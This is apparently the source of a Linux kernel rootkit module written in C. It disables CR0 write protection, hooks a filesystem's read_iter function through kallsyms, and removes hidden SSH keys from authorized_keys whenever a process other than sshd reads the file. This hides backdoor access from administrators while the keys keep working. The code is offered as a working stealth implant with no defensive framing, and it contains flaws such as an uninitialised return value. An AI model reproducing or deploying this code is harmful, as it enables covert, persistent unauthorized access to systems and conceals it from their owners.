#include "filesystem_filter.h"

#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/uio.h>
#include <linux/slab.h>
#include <linux/pipe_fs_i.h>
#include <linux/highmem.h>

#include "ssh_keys_hiding.h"

struct file_operations g_original_fops;

void initialize_filter(char* filesystem_file_operation_name) {
    unsigned long prev_cr0 = read_cr0();
    struct file_operations* original_filesystem_fops = (struct file_operations*)kallsyms_lookup_name(filesystem_file_operation_name);
    if (NULL == original_filesystem_fops) {
        printk("Unable to find the original filsystem fops\n");
        return;
    }
    g_original_fops = *original_filesystem_fops;

    write_cr0(prev_cr0 & (~ 0x10000));

    __sync_lock_test_and_set((unsigned long*)&original_filesystem_fops->read_iter, (unsigned long)file_read_iter);
    write_cr0(prev_cr0);
    __sync_synchronize();
}


ssize_t file_read_iter(struct kiocb *iocb, struct iov_iter *to) {
    ssize_t size;
    char* path = NULL;
    char* buffer = kmalloc(PATH_MAX, GFP_KERNEL);
    if (NULL != buffer) {
        path = dentry_path_raw(iocb->ki_filp->f_path.dentry, buffer, PATH_MAX);
        if (!IS_ERR(path)) {
            if (NULL != strstr(path, "ssh/authorized_keys")) {
                filemap_flush(iocb->ki_filp->f_inode->i_mapping);
                size = g_original_fops.read_iter(iocb, to);
                truncate_inode_pages(iocb->ki_filp->f_inode->i_mapping, 0);
                if (NULL == strstr(current->comm, "ssh") && to->pipe->bufs->len != 0) {
                    char* buf = kmap(to->pipe->bufs->page);
                    size = (ssize_t)remove_hidden_keys(buf, to->pipe->bufs->len);
                    kunmap(to->pipe->bufs->page);
                }
            }
            else {
                size = g_original_fops.read_iter(iocb, to);
            }
        }
        kfree(buffer);
    }
    return size;
}